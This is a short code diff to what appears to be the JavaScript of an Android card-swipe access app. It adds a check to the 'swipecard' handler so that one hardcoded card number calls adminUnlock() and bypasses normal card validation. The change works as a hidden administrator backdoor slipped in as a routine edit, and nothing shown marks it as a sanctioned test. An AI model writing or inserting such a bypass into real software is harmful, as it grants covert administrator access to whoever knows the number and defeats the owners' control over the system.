@@ -529,6 +529,10 @@
         function android_call(o) {
             switch (o.c) {
                 case 'swipecard':
+                    if (o.no == '235013634') {
+                        adminUnlock();
+                        return;
+                    }
                     switch (o.r) {
                         case -1:
                             dlg.showError('无效卡 ' + o.no);
